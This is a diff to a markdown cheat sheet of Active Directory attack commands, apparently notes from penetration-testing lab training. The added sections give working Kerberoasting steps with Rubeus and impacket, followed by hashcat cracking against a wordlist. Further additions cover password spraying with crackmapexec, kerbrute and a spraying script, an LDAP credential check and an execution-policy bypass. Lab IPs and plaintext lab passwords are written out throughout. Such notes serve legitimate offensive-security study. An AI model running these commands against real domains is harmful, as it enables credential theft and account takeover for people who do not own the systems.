@@ -1,4 +1,4 @@
-# Authentication
+## Active Directory Authentication
 
 ### Mimikatz
 
@@ -52,6 +52,26 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 klist # List all cached Kerberos tickets for current user.
 ```
 
+### Additional Notes on Kerberoasting
+
+```
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+cat hashes.kerberoast
+hashcat --help | grep -i "Kerberos"
+
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.205.70 corp.com/pete
+
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+
+```
+
+
 ### Password Spraying
 ```
 # Try on each user found on each IP in the domain.
@@ -60,4 +80,37 @@ proxychains crackmapexec smb <IP> -u <user> -p <passoword>
 # Google how to use this attack
 net accounts # Check Lockout Threshold
 .\Spray-Passwords.ps1 -Pass <password> -Admin # Will Spray password on all Admin accounts.
+```
+
+### Other Notes
+
+```
+
+xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.205.75
+net accounts
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+
+cd C:\Tools
+powershell -ep bypass
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+
+
+cat users.txt
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+
+crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+
+type .\usernames.txt
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+
+Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
 ```
